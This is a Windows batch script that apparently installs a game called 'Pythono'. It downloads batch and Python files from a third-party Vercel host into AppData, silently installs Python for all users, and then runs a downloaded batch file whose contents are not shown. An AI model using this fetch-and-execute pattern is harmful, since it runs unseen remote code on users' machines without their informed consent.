@echo off
setlocal

set "BASE=https://files-hosterino.vercel.app"
set "TARGET=%APPDATA%\games\data"
set "PYTHON_INSTALLER=%TEMP%\python_installer.exe"
set "TEMPFILE=%TEMP%\auto_pythono_path.bat"

mkdir "%TARGET%" >nul 2>&1

powershell -Command "(New-Object Net.WebClient).DownloadFile('%BASE%/pythono_game.bat', '%TARGET%\game.bat')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%BASE%/pythono_launcher.py', '%TARGET%\launcher.py')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%BASE%/auto_pythono_path.bat', '%TEMPFILE%')"

where python >nul 2>&1
if %errorlevel% neq 0 (
    echo Python not found. Installing...
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.13.3/python-3.13.3-amd64.exe', '%PYTHON_INSTALLER%')"
    "%PYTHON_INSTALLER%" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    timeout /t 10 >nul
)

where python >nul 2>&1
if %errorlevel% neq 0 (
    echo Python installation failed or not detected. Exiting...
    pause
    exit /b 1
)

call "%TEMPFILE%"
endlocal
cls
echo Pythono installed! you can now use the command "game" in cmd.
pause